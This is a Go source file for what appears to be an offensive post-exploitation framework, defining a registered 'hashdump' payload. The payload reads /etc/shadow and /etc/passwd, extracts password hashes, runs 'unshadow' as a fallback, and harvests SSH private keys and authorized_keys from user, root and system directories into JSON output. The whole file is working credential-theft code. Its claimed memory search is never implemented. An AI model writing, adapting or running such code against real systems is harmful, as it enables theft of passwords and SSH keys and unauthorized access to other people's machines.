package payloads

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func init() {
	Register(&HashDump{})
}

type HashDump struct{}

func (h *HashDump) Name() string     { return "hashdump" }
func (h *HashDump) Category() string { return "credential" }
func (h *HashDump) Description() string {
	return "Dump password hashes from /etc/shadow, /etc/passwd, search memory, SSH keys"
}

func (h *HashDump) Execute(args map[string]string) ([]byte, error) {
	result := h.execute()
	return MarshalJSON(result)
}

type hashdumpResult struct {
	Timestamp   string            `json:"timestamp"`
	Hostname    string            `json:"hostname"`
	ShadowData  string            `json:"shadow_file,omitempty"`
	PasswdData  string            `json:"passwd_file,omitempty"`
	LinuxHashes map[string]string `json:"linux_hashes"`
	SSHKeys     []sshKeyEntry     `json:"ssh_keys"`
	MemoryProcs []memProcEntry    `json:"memory_processes"`
	Summary     map[string]int    `json:"summary"`
}

type sshKeyEntry struct {
	Path    string `json:"path"`
	Type    string `json:"type"`
	Content string `json:"content,omitempty"`
}

type memProcEntry struct {
	PID     int    `json:"pid"`
	Name    string `json:"name"`
	Cmdline string `json:"cmdline,omitempty"`
}

func (h *HashDump) execute() *hashdumpResult {
	hostname, _ := os.Hostname()
	r := &hashdumpResult{
		Timestamp:   time.Now().UTC().Format(time.RFC3339),
		Hostname:    hostname,
		LinuxHashes: make(map[string]string),
	}

	// /etc/shadow (requires root)
	if data, err := os.ReadFile("/etc/shadow"); err == nil {
		r.ShadowData = string(data)
		scanner := bufio.NewScanner(bytes.NewReader(data))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			parts := strings.SplitN(line, ":", 2)
			if len(parts) >= 2 {
				hash := parts[1]
				if hash != "" && hash != "*" && hash != "!" && hash != "!!" {
					r.LinuxHashes[parts[0]] = hash
				}
			}
		}
	}

	// /etc/passwd
	if data, err := os.ReadFile("/etc/passwd"); err == nil {
		r.PasswdData = string(data)
	}

	// Try unshadow if not root
	if len(r.LinuxHashes) == 0 {
		cmd := exec.Command("unshadow", "/etc/passwd", "/etc/shadow")
		out, err := cmd.Output()
		if err == nil {
			scanner := bufio.NewScanner(bytes.NewReader(out))
			for scanner.Scan() {
				line := strings.TrimSpace(scanner.Text())
				if line == "" {
					continue
				}
				parts := strings.SplitN(line, ":", 2)
				if len(parts) >= 2 {
					hash := parts[1]
					if hash != "" && hash != "x" && hash != "*" && hash != "!" {
						r.LinuxHashes[parts[0]] = hash
					}
				}
			}
		}
	}

	// SSH Keys
	r.SSHKeys = extractSSHKeys()

	// Summary
	r.Summary = map[string]int{
		"hashes":    len(r.LinuxHashes),
		"ssh_keys":  len(r.SSHKeys),
		"processes": len(r.MemoryProcs),
	}

	return r
}

func extractSSHKeys() []sshKeyEntry {
	var keys []sshKeyEntry
	home, _ := os.UserHomeDir()

	searchPaths := []string{
		filepath.Join(home, ".ssh"),
		"/root/.ssh",
		"/etc/ssh",
	}

	for _, searchPath := range searchPaths {
		entries, err := os.ReadDir(searchPath)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			if name == "id_rsa" || name == "id_dsa" || name == "id_ecdsa" || name == "id_ed25519" || name == "authorized_keys" {
				fullPath := filepath.Join(searchPath, name)
				data, err := os.ReadFile(fullPath)
				if err != nil {
					continue
				}
				content := string(data)
				keyType := "unknown"
				if strings.Contains(content, "PRIVATE KEY") {
					keyType = "private_key"
				} else if strings.Contains(content, "ssh-") {
					keyType = "public_key"
				}

				if len(content) > 500 {
					content = content[:500] + "..."
				}

				keys = append(keys, sshKeyEntry{
					Path:    fullPath,
					Type:    keyType,
					Content: content,
				})
			}
		}
	}

	return keys
}

func fmtString(v interface{}) string {
	return fmt.Sprintf("%v", v)
}
